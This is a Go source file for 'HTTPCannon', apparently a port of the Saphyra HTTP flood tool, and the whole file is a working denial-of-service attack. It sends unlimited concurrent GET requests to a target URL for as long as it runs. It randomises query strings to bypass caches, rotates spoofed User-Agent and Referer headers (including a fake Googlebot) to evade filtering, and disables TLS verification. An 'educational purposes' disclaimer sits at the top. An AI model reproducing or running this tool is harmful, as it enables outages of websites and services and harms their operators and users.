// ─────────────────────────────────────────────
//  Project: HTTPCannon  (GoLang Port)
//  Inspired by Project: Saphyra (Python3 Port)  
//  Developed with the assistance of AI tools.
//  Disclaimer - This software is provided for educational and research purposes only.
//  The author is not responsible for any misuse, damages, or illegal activities conducted using this tool.
//  By using this software, you agree that you are solely responsible for your actions and compliance with applicable laws and regulations.
//  Attribution: Credit to original authors and contributors where applicable.
// ─────────────────────────────────────────────
package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ─────────────────────────────────────────────
//  Default header pools
// ─────────────────────────────────────────────

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"curl/8.7.1",
	"python-requests/2.31.0",
	"Go-http-client/2.0",
	"Wget/1.21.4 (linux-gnu)",
	"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}

var defaultReferers = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://duckduckgo.com/?q=",
	"https://search.yahoo.com/search?p=",
	"https://www.reddit.com/r/",
	"https://twitter.com/search?q=",
	"https://www.facebook.com/",
	"https://www.linkedin.com/search/results/all/?keywords=",
	"https://t.co/",
	"https://news.ycombinator.com/",
	"https://www.youtube.com/results?search_query=",
	"https://stackoverflow.com/search?q=",
	"https://www.wikipedia.org/wiki/Special:Search?search=",
	"https://www.amazon.com/s?k=",
	"https://www.baidu.com/s?wd=",
}

// ─────────────────────────────────────────────
//  buildblock – sophisticated random string
// ─────────────────────────────────────────────

const (
	charsetAlphaNum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	charsetHex      = "0123456789abcdef"
	charsetWords    = "the quick brown fox jumps over lazy dog"
)

var wordPool = []string{
	"cache", "token", "session", "ref", "id", "src", "ver", "ts",
	"nonce", "sig", "key", "hash", "rand", "cb", "uid", "gid",
	"page", "limit", "offset", "sort", "order", "filter", "query",
}

func buildblock(n int) string {
	strategy := rand.Intn(4)
	switch strategy {
	case 0: // pure alphanumeric
		b := make([]byte, n)
		for i := range b {
			b[i] = charsetAlphaNum[rand.Intn(len(charsetAlphaNum))]
		}
		return string(b)
	case 1: // hex string (looks like a hash fragment)
		b := make([]byte, n)
		for i := range b {
			b[i] = charsetHex[rand.Intn(len(charsetHex))]
		}
		return string(b)
	case 2: // word + number combo
		word := wordPool[rand.Intn(len(wordPool))]
		num := rand.Intn(99999)
		combined := fmt.Sprintf("%s%d", word, num)
		if len(combined) > n {
			return combined[:n]
		}
		pad := make([]byte, n-len(combined))
		for i := range pad {
			pad[i] = charsetAlphaNum[rand.Intn(len(charsetAlphaNum))]
		}
		return combined + string(pad)
	default: // timestamp-seeded noise
		ts := fmt.Sprintf("%x", time.Now().UnixNano())
		extra := make([]byte, n)
		for i := range extra {
			extra[i] = charsetAlphaNum[rand.Intn(len(charsetAlphaNum))]
		}
		combined := ts + string(extra)
		return combined[:n]
	}
}

// ─────────────────────────────────────────────
//  Stats counter
// ─────────────────────────────────────────────

var (
	totalSent   uint64
	totalOK     uint64
	totalFailed uint64
)

// ─────────────────────────────────────────────
//  HTTP worker
// ─────────────────────────────────────────────

type Cannon struct {
	rawURL     string
	host       string
	userAgents []string
	referers   []string
	client     *http.Client
}

func newCannon(rawURL string, userAgents, referers []string, maxConns int) (*Cannon, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}
	host := parsed.Host

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConnsPerHost: maxConns,
		MaxConnsPerHost:     maxConns, // hard cap on open TCP connections to target
		DisableKeepAlives:   false,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}

	return &Cannon{
		rawURL:     rawURL,
		host:       host,
		userAgents: userAgents,
		referers:   referers,
		client:     client,
	}, nil
}

func (c *Cannon) fire() {
	joiner := "?"
	if strings.Contains(c.rawURL, "?") {
		joiner = "&"
	}

	target := c.rawURL + joiner +
		buildblock(rand.Intn(8)+3) + "=" +
		buildblock(rand.Intn(8)+3)

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		atomic.AddUint64(&totalFailed, 1)
		return
	}

	req.Header.Set("User-Agent", c.userAgents[rand.Intn(len(c.userAgents))])
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Referer", c.referers[rand.Intn(len(c.referers))]+buildblock(rand.Intn(51)+50))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(51)+110))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", c.host)
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("DNT", "1")

	atomic.AddUint64(&totalSent, 1)

	resp, err := c.client.Do(req)
	if err != nil {
		atomic.AddUint64(&totalFailed, 1)
		return
	}
	resp.Body.Close()
	atomic.AddUint64(&totalOK, 1)
}

// ─────────────────────────────────────────────
//  Load file lines helper
// ─────────────────────────────────────────────

func loadLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, sc.Err()
}

// ─────────────────────────────────────────────
//  Main
// ─────────────────────────────────────────────

func main() {
	targetURL := flag.String("url", "", "Target URL (required)")
	threads := flag.Int("threads", 0, "Number of concurrent goroutines (0 = unlimited)")
	conns := flag.Int("conns", 0, "Max open TCP connections to target (0 = unlimited)")
	uaFile := flag.String("ua-file", "", "Path to file with User-Agent strings (one per line)")
	refFile := flag.String("ref-file", "", "Path to file with Referer strings (one per line)")
	duration := flag.Duration("duration", 0, "How long to run, e.g. 30s, 5m (0 = run forever)")
	rps := flag.Int("rps", 0, "Max requests per second across all goroutines (0 = no limit)")
	flag.Parse()

	if *targetURL == "" {
		fmt.Fprintln(os.Stderr, "Error: -url is required")
		flag.Usage()
		os.Exit(1)
	}

	// ── user-agents ──────────────────────────────
	userAgents := defaultUserAgents
	if *uaFile != "" {
		lines, err := loadLines(*uaFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Cannot read UA file: %v\n", err)
			os.Exit(1)
		}
		userAgents = lines
		fmt.Printf("[+] Loaded %d custom User-Agents\n", len(userAgents))
	}

	// ── referers ─────────────────────────────────
	referers := defaultReferers
	if *refFile != "" {
		lines, err := loadLines(*refFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Cannot read Referer file: %v\n", err)
			os.Exit(1)
		}
		referers = lines
		fmt.Printf("[+] Loaded %d custom Referers\n", len(referers))
	}

	maxConns := *conns
	if maxConns == 0 {
		maxConns = 1<<31 - 1 // effectively unlimited
	}

	cannon, err := newCannon(*targetURL, userAgents, referers, maxConns)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	// ── concurrency model ─────────────────────────
	unlimited := *threads == 0
	if unlimited {
		fmt.Println("[*] Thread mode : UNLIMITED (goroutines spawned continuously)")
	} else {
		fmt.Printf("[*] Thread mode : fixed pool of %d goroutines\n", *threads)
	}

	if *conns > 0 {
		fmt.Printf("[*] Max conns   : %d open TCP connections\n", *conns)
	} else {
		fmt.Println("[*] Max conns   : UNLIMITED")
	}

	if *duration > 0 {
		fmt.Printf("[*] Duration    : %v\n", *duration)
	} else {
		fmt.Println("[*] Duration    : infinite (Ctrl+C to stop)")
	}
	if *rps > 0 {
		fmt.Printf("[*] Rate limit  : %d req/s\n", *rps)
	}

	fmt.Printf("[*] Target      : %s\n", *targetURL)
	fmt.Println("[*] Firing ...")

	// ── stop signal ───────────────────────────────
	stop := make(chan struct{})
	if *duration > 0 {
		go func() {
			time.Sleep(*duration)
			close(stop)
		}()
	}

	// ── rate limiter ──────────────────────────────
	var ticker *time.Ticker
	var tickC <-chan time.Time
	if *rps > 0 {
		ticker = time.NewTicker(time.Second / time.Duration(*rps))
		tickC = ticker.C
		defer ticker.Stop()
	}

	// ── stats printer ─────────────────────────────
	go func() {
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		start := time.Now()
		for {
			select {
			case <-stop:
				return
			case <-t.C:
				elapsed := time.Since(start).Seconds()
				sent := atomic.LoadUint64(&totalSent)
				ok := atomic.LoadUint64(&totalOK)
				failed := atomic.LoadUint64(&totalFailed)
				rpsNow := float64(sent) / elapsed
				fmt.Printf("\r[stats] sent=%-8d ok=%-8d fail=%-8d avg_rps=%-8.1f elapsed=%.0fs   ",
					sent, ok, failed, rpsNow, elapsed)
			}
		}
	}()

	// ── worker loop ───────────────────────────────
	if unlimited {
		// Unlimited: spawn a new goroutine for every request
		var wg sync.WaitGroup
		for {
			select {
			case <-stop:
				wg.Wait()
				goto done
			default:
			}
			if tickC != nil {
				select {
				case <-tickC:
				case <-stop:
					wg.Wait()
					goto done
				}
			}
			wg.Add(1)
			go func() {
				defer wg.Done()
				cannon.fire()
			}()
		}
	} else {
		// Fixed pool
		sem := make(chan struct{}, *threads)
		var wg sync.WaitGroup
		for {
			select {
			case <-stop:
				wg.Wait()
				goto done
			default:
			}
			if tickC != nil {
				select {
				case <-tickC:
				case <-stop:
					wg.Wait()
					goto done
				}
			}
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer func() {
					<-sem
					wg.Done()
				}()
				cannon.fire()
			}()
		}
	}

done:
	fmt.Println("\n[*] Done.")
	fmt.Printf("    Sent: %d | OK: %d | Failed: %d\n",
		atomic.LoadUint64(&totalSent),
		atomic.LoadUint64(&totalOK),
		atomic.LoadUint64(&totalFailed))
}
